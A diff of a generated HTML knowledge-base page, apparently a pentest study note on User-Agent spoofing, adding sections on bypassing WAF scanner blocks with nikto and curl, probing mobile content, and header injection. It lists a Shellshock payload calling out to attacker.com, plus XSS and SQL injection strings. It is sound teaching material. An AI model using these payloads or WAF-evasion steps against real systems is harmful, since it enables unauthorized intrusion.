@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:56 -->
+<!-- 2026-07-30 Thu 22:13 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>User-Agent Spoofing</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,41 +886,203 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgbffb74c">User-Agent Spoofing</a>
+<li><a href="#orgfe7ca64">Purpose in Cyber Security</a></li>
+<li><a href="#org2dd0c39">Pentest-Relevant Applications</a>
 <ul>
-<li><a href="#orgd2dfa6a">Purpose in Cyber Security</a></li>
+<li><a href="#org080ed8d">Bypassing User-Agent-Based Access Controls</a></li>
+<li><a href="#org37d4bce">Testing for Mobile-Specific Content/Vulnerabilities</a></li>
+<li><a href="#orgcf5b64d">Blind Injection via User-Agent Header</a></li>
 </ul>
 </li>
+<li><a href="#org5bee65d">Tips</a></li>
 </ul>
 </div>
 </div>
-<div id="outline-container-orgbffb74c" class="outline-2">
-<h2 id="orgbffb74c">User-Agent Spoofing</h2>
-<div class="outline-text-2" id="text-orgbffb74c">
 <p>
-User-Agent spoofing is the intentional alteration of a client application's <a href="User-Agent.html#user-agent">User-Agent</a> string. This string typically identifies the application (e.g., web browser), Operating System, and device type to a server during an <a href="Hypertext Transfer Protocol.html#hypertext-transfer-protocol">Hypertext Transfer Protocol</a> request, allowing for <a href="content negotiation.html#content-negotiation">Content Negotiation</a> such as serving mobile-optimized sites to smartphones. User-Agent strings are considered a valuable Artifact and a moderately difficult <a href="Indicators Of compromise.html#indicators-of-compromise">Indicators Of Compromise</a> for adversaries to change without altering their tools.
+User-Agent spoofing is the intentional alteration of a client
+application's <a href="20260314T005643--user-agent__concept_networking.html">User-Agent</a> string. This
+string typically identifies the application (e.g., web browser),
+Operating System, and device type to a server during an
+<a href="20260207T064917==http--hypertext-transfer-protocol__networking_protocol.html">HTTP</a> request, allowing for
+<a href="20260314T005644--content-negotiation__concept_networking.html">Content Negotiation</a> such as serving
+mobile-optimized sites to smartphones. User-Agent strings are
+considered a valuable artifact and a moderately difficult
+<a href="20260212T065441==ioc--indicators-of-compromise__concept_cybersecurity.html">Indicator of Compromise</a> for adversaries
+to change without altering their underlying tools — see
+<a href="20260327T192843--pyramid-of-pain__cybersecurity_model.html">Pyramid of Pain</a> for why that difficulty
+matters more than the indicator itself.
 </p>
-</div>
-<div id="outline-container-orgd2dfa6a" class="outline-3">
-<h3 id="orgd2dfa6a">Purpose in Cyber Security</h3>
-<div class="outline-text-3" id="text-orgd2dfa6a">
+
 <p>
-In the context of <a href="Cyber Security.html#cyber-security-moc">Cyber Security</a>, attackers employ user-agent spoofing primarily for two reasons:
+Related: <a href="20260314T005643--user-agent__concept_networking.html">User-Agent</a>
+         <a href="20260327T192843--pyramid-of-pain__cybersecurity_model.html">Pyramid of Pain</a>
+         <a href="20260212T065441==ioc--indicators-of-compromise__concept_cybersecurity.html">Indicators of Compromise</a>
+         <a href="20260206T060732--subdomain-enumeration__cybersecurity_technique.html">Subdomain Enumeration</a>
+         <a href="20260206T060456--content-discovery__concept_cybersecurity_technique.html">Content Discovery</a>
+         <a href="20260611T064753--web-application-testing-methodology__cybersecurity_pentesting_technique.html">Web Application Testing Methodology</a>
+</p>
+<div id="outline-container-orgfe7ca64" class="outline-2">
+<h2 id="orgfe7ca64">Purpose in Cyber Security</h2>
+<div class="outline-text-2" id="text-orgfe7ca64">
+<p>
+In the context of cyber security, attackers employ user-agent
+spoofing primarily for two reasons:
 </p>
 
 <ol class="org-ol">
-<li>Evading Detection: Adversaries may change their user-agent string to impersonate legitimate traffic, such as a common web browser. This helps them blend in with normal network activity and bypass security defenses that might flag unusual or known malicious user-agent strings.</li>
-<li>Exploiting Vulnerabilities: Attackers might also spoof user-agents to exploit specific vulnerabilities in how a server processes or parses these strings.</li>
+<li><b>Evading Detection:</b> Adversaries may change their user-agent
+string to impersonate legitimate traffic, such as a common web
+browser. This helps them blend in with normal network activity
+and bypass security defenses that might flag unusual or known
+malicious user-agent strings.</li>
+<li><b>Exploiting Vulnerabilities:</b> Attackers might also spoof
+user-agents to exploit specific vulnerabilities in how a server
+processes or parses these strings.</li>
 </ol>
 
 <p>
-Security analysts and threat hunters monitor User-Agent strings as part of threat hunting to identify <a href="Malware.html#malware">Malware</a> variants, automated scanners, and attack frameworks that use unique or unusual user-agent strings for <a href="Command and Control Server.html#command-and-control-server">Command and Control Server</a> communications, or to detect anomalies that suggest a compromise. By spoofing, attackers aim to circumvent these monitoring efforts.
+Security analysts and threat hunters monitor User-Agent strings as
+part of threat hunting to identify <a href="20260206T060714--malware__concept_cybersecurity.html">Malware</a>
+variants, automated scanners, and attack frameworks that use unique
+or unusual user-agent strings for
+<a href="20260314T003332--command-and-control-server__concept_cybersecurity.html">Command and Control Server</a>
+communications, or to detect anomalies that suggest a compromise.
+By spoofing, attackers aim to circumvent these monitoring efforts.
 </p>
 </div>
+</div>
+<div id="outline-container-org2dd0c39" class="outline-2">
+<h2 id="org2dd0c39">Pentest-Relevant Applications</h2>
+<div class="outline-text-2" id="text-org2dd0c39">
+<p>
+User-Agent spoofing isn't only a defensive-evasion concept — it's a
+practical technique with direct application during testing:
+</p>
+</div>
+<div id="outline-container-org080ed8d" class="outline-3">
+<h3 id="org080ed8d">Bypassing User-Agent-Based Access Controls</h3>
+<div class="outline-text-3" id="text-org080ed8d">
+<p>
+Some applications serve different content, or restrict access
+entirely, based on the User-Agent header — a common but weak
+control mechanism. If a <code>WAF</code> or application blocks known scanner
+User-Agents (e.g. <code>sqlmap</code>, <code>Nikto</code>, <code>Nmap Scripting Engine</code>),
+spoofing a common browser User-Agent can bypass that check entirely
+without changing anything else about the request.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_49bcf8680a1a445fb2f3dd04f15865c7>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_49bcf8680a1a445fb2f3dd04f15865c7=document.querySelector('button[name=btn_49bcf8680a1a445fb2f3dd04f15865c7]');
+copyBtnbtn_49bcf8680a1a445fb2f3dd04f15865c7.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Nikto with a spoofed User-Agent to avoid trivial signature blocking\nnikto -h target.com -useragent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"\n\n# Manual test with curl\ncurl -A \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\" http://target.com/admin\n`);copyBtnbtn_49bcf8680a1a445fb2f3dd04f15865c7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_49bcf8680a1a445fb2f3dd04f15865c7.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Nikto with a spoofed User-Agent to avoid trivial signature blocking
+</span>nikto -h target.com -useragent <span style="color: var(--clr-string); background-color: var(--bg-string);">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</span>
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Manual test with curl
+</span>curl -A <span style="color: var(--clr-string); background-color: var(--bg-string);">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</span> http://target.com/admin
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org37d4bce" class="outline-3">
+<h3 id="org37d4bce">Testing for Mobile-Specific Content/Vulnerabilities</h3>
+<div class="outline-text-3" id="text-org37d4bce">
+<p>
+Since User-Agent drives content negotiation, spoofing a mobile
+device string can surface a completely different application
+surface — a mobile-optimized site or API path that wasn't reachable
+(or discoverable via content discovery) through the default desktop
+response.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0d897e5f5c074027ab27227a91e5f99f>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_0d897e5f5c074027ab27227a91e5f99f=document.querySelector('button[name=btn_0d897e5f5c074027ab27227a91e5f99f]');
+copyBtnbtn_0d897e5f5c074027ab27227a91e5f99f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl -A \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15\" http://target.com\n`);copyBtnbtn_0d897e5f5c074027ab27227a91e5f99f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0d897e5f5c074027ab27227a91e5f99f.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">curl -A <span style="color: var(--clr-string); background-color: var(--bg-string);">"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"</span> http://target.com
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgcf5b64d" class="outline-3">
+<h3 id="orgcf5b64d">Blind Injection via User-Agent Header</h3>
+<div class="outline-text-3" id="text-orgcf5b64d">
+<p>
+The User-Agent header is frequently logged server-side without
+sanitisation — making it a viable, often-overlooked injection point
+distinct from the usual URL/body parameters.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_a5f269f5d2f94fac84c6001aef954bd8>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_a5f269f5d2f94fac84c6001aef954bd8=document.querySelector('button[name=btn_a5f269f5d2f94fac84c6001aef954bd8]');
+copyBtnbtn_a5f269f5d2f94fac84c6001aef954bd8.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`User-Agent: () { :; }; /bin/bash -c \"curl http://attacker.com/rce-confirmed\"\nUser-Agent: <script>alert(document.cookie)</script>\nUser-Agent: ' OR '1'='1\n`);copyBtnbtn_a5f269f5d2f94fac84c6001aef954bd8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a5f269f5d2f94fac84c6001aef954bd8.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-http">User-Agent: () { :; }; /bin/bash -c "curl http://attacker.com/rce-confirmed"
+User-Agent: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+User-Agent: ' OR '1'='1
+</pre>
+</div></div>
+
+<p>
+Test this specifically if logs are ever viewed in an admin panel
+(stored XSS via logged User-Agent) or if the backend does anything
+beyond simple logging with the header value.
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-org5bee65d" class="outline-2">
+<h2 id="org5bee65d">Tips</h2>
+<div class="outline-text-2" id="text-org5bee65d">
+<ul class="org-ul">
+<li>On the exam, don't overlook the User-Agent header as an injection
+point purely because it's not a visible form field or URL
+parameter — anything server-processed is worth testing, and this
+header specifically is often unsanitised because it's assumed to
+be informational only</li>
+<li>If a WAF or rate-limiter appears to be blocking your automated
+tool specifically (works manually via browser, fails via
+Gobuster/Nikto/sqlmap), check whether it's filtering on the
+tool's default User-Agent before assuming a more sophisticated
+defense is in play</li>
+<li>Mobile User-Agent spoofing is a fast, low-effort way to check for
+a parallel/hidden attack surface — worth trying even when there's
+no specific reason to suspect one exists, since it costs almost
+nothing to test</li>
+</ul>
 </div>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -910,6 +1090,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
